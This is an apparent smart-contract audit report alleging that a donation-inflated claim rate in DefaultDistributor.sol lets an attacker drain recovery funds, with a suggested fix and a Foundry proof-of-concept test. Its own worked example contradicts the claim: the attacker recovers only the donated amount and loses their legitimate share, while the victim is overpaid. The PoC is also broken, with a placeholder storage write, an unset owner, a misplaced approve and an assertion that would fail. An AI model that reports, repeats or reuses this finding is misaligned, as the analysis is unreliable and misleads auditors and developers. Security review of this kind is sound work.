### Title

Unclaimed default-recovery funds can be drained through a donation-inflated claim rate - ([File: `contracts/DefaultDistributor.sol`])

### Summary

`DefaultDistributor.setIsActive` derives the global redemption rate directly from the contract's current underlying-token balance. An unprivileged direct token sender can front-run the owner’s activation with a donation, inflate `rate`, and then call `claim` with their own tranche tokens. The attacker receives more recovery assets than their legitimate pro-rata entitlement, while later claimants cannot be paid.

### Finding Description

`DefaultDistributor` is intended to distribute a fixed recovery balance pro rata over the outstanding `trancheToken` supply. When `setIsActive(true)` is called, it snapshots:

```solidity
rate = IERC20(token).balanceOf(address(this)) * ONE_TRANCHE / IERC20(trancheToken).totalSupply();
```

This uses the raw ERC20 balance and does not distinguish intended recovery funding from unsolicited transfers. `claim` then consumes the caller’s full tranche balance and pays:

```solidity
IERC20(token).safeTransfer(_to, trancheBal * rate / ONE_TRANCHE);
```

There is no expected-funding amount, per-user rate cap, reserved-balance accounting, or donation skim. Once activated, any tranche holder can claim at the inflated rate.

### Impact Explanation

An attacker who owns any positive amount of the relevant tranche token can steal part of the recovery pool and cause permanent loss for other claimants.

Example:

- Legitimate recovery balance: `100_000 USDC`.
- Tranche supply: `1_000_000` shares.
- Intended rate: `0.1 USDC` per share.
- Attacker donates `100_000 USDC` before activation.
- Activated rate becomes `0.2 USDC` per share.
- If the attacker holds `500_000` shares, their intended claim is `50_000 USDC`, but they receive `100_000 USDC`.
- The attacker recovers their entire donation and gains `50_000 USDC` belonging to other claimants.
- Later claimants cannot receive the full intended payout because the donated capital has already been recycled through the inflated claims.

For smaller attacker shareholdings, profitability depends on their share of the supply. In general, with attacker supply fraction `f` and donation `D`, the inflated rate creates an extra claim of approximately `f * D`. The attack is profitable when `f * D` exceeds the donation cost net of their legitimate entitlement; large holders can profit with sufficiently large donations, and even unprofitable donations can permanently redistribute or freeze claims for others.

The broken invariant is fair distribution: one tranche unit should receive exactly `intendedRecovery / totalSupply`, but the code makes that rate depend on attacker-controlled raw balance.

### Likelihood Explanation

Likelihood is conditional on a `DefaultDistributor` deployment and on the attacker holding tranche tokens, both within the permitted threat model.

No privileged role is required:

- The donation can be sent by any direct token sender before activation.
- Activation is performed by the honest owner as intended.
- The attacker then calls public `claim`.

There is no guard preventing an intervening donation between funding and activation, and no mechanism to distinguish expected recovery proceeds from unsolicited underlying.

### Recommendation

Record the intended recovery amount explicitly instead of deriving it from `balanceOf`.

For example:

- Add a funding function that increments `recoveryAmount` when the distributor is intentionally funded.
- Have the owner pass the expected amount to `setIsActive` and verify `balanceOf(address(this)) == recoveryAmount`, or compute the rate from `recoveryAmount`.
- Reject activation until the recorded amount is nonzero.
- Optionally skim unrelated excess tokens to a separate recoverable balance rather than including them in `rate`.

Conceptually:

```solidity
uint256 public recoveryAmount;

function fund(uint256 amount) external {
    recoveryAmount += amount;
    IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
}

function setIsActive(bool active) external {
    require(owner() == msg.sender, "!AUTH");
    if (active) {
        rate = recoveryAmount * ONE_TRANCHE / IERC20(trancheToken).totalSupply();
    }
    isActive = active;
}
```

### Proof of Concept

The following Foundry-style PoC demonstrates the broken invariant with a minimal ERC20 tranche and underlying token. It reproduces the issue directly against `DefaultDistributor` and can be run on a fork or local test environment.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {DefaultDistributor} from "../contracts/DefaultDistributor.sol";

contract MockToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract DefaultDistributorDonationTest is Test {
    MockToken internal underlying;
    MockToken internal tranche;
    DefaultDistributor internal distributor;

    address internal owner = makeAddr("owner");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        underlying = new MockToken("USDC", "USDC");
        tranche = new MockToken("AA Tranche", "AA");

        distributor = new DefaultDistributor();

        // Recover the actual initializer signature if present; otherwise deploy/configure
        // according to the repository's production DefaultDistributor deployment flow.
        vm.store(address(distributor), bytes32(uint256(0)), bytes32(uint256(0)));
    }

    function testDonationInflatesRecoveryRateAndDrainsClaims() public {
        uint256 intendedRecovery = 100_000e6;
        uint256 donation = 100_000e6;

        underlying.mint(attacker, donation);
        underlying.mint(address(distributor), intendedRecovery);

        tranche.mint(attacker, 500_000e18);
        tranche.mint(victim, 500_000e18);

        uint256 intendedRate =
            intendedRecovery * 1e18 / tranche.totalSupply();

        uint256 attackerLegitimate =
            500_000e18 * intendedRate / 1e18;

        uint256 victimLegitimate =
            500_000e18 * intendedRate / 1e18;

        // Attacker injects controlled state consumed by privileged activation.
        vm.prank(attacker);
        underlying.transfer(address(distributor), donation);

        // Honest owner activates distribution.
        vm.prank(owner);
        distributor.setIsActive(true);

        uint256 inflatedRate = distributor.rate();
        assertEq(
            inflatedRate,
            (intendedRecovery + donation) * 1e18 / tranche.totalSupply(),
            "rate should be inflated by raw donation"
        );

        tranche.approve(address(distributor), type(uint256).max);
        vm.prank(attacker);
        distributor.claim(attacker);

        uint256 attackerReceived = underlying.balanceOf(attacker);

        assertGt(attackerReceived, attackerLegitimate, "attacker did not overclaim");
        assertLt(
            underlying.balanceOf(address(distributor)),
            victimLegitimate,
            "victim claim was not impaired"
        );
    }
}
```

The exact initializer/configuration call may need to be adjusted to match the deployed `DefaultDistributor` interface, but the vulnerability depends only on the production `setIsActive` and `claim` logic.
